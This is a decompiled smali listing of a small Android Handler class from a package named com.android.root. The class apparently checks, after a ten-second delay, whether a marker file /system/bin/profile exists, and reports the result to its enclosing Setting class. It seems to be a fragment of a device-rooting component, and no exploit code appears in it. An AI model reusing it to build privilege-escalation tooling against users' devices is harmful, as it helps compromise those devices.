.class Lcom/android/root/Setting$1;
.super Landroid/os/Handler;
.source "Setting.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/root/Setting;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/root/Setting;


# direct methods
.method constructor <init>(Lcom/android/root/Setting;)V
    .locals 0
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/root/Setting$1;->this$0:Lcom/android/root/Setting;

    .line 51
    invoke-direct {p0}, Landroid/os/Handler;-><init>()V

    return-void
.end method


# virtual methods
.method public handleMessage(Landroid/os/Message;)V
    .locals 5
    .parameter "msg"

    .prologue
    .line 68
    iget v3, p1, Landroid/os/Message;->what:I

    const/4 v4, 0x1

    if-ne v3, v4, :cond_1

    .line 70
    iget-object v3, p0, Lcom/android/root/Setting$1;->this$0:Lcom/android/root/Setting;

    const/4 v4, 0x0

    invoke-static {v3, v4}, Lcom/android/root/Setting;->access$0(Lcom/android/root/Setting;Z)V

    .line 91
    :cond_0
    :goto_0
    return-void

    .line 72
    :cond_1
    iget v3, p1, Landroid/os/Message;->what:I

    const/4 v4, 0x2

    if-ne v3, v4, :cond_0

    .line 74
    const-wide/16 v3, 0x2710

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 79
    :goto_1
    new-instance v1, Ljava/io/File;

    const-string v3, "/system/bin/profile"

    invoke-direct {v1, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 80
    .local v1, f:Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    .line 88
    .local v2, rs:Z
    iget-object v3, p0, Lcom/android/root/Setting$1;->this$0:Lcom/android/root/Setting;

    invoke-static {v3, v2}, Lcom/android/root/Setting;->access$0(Lcom/android/root/Setting;Z)V

    goto :goto_0

    .line 75
    .end local v1           #f:Ljava/io/File;
    .end local v2           #rs:Z
    :catch_0
    move-exception v0

    .line 77
    .local v0, e:Ljava/lang/InterruptedException;
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1
.end method
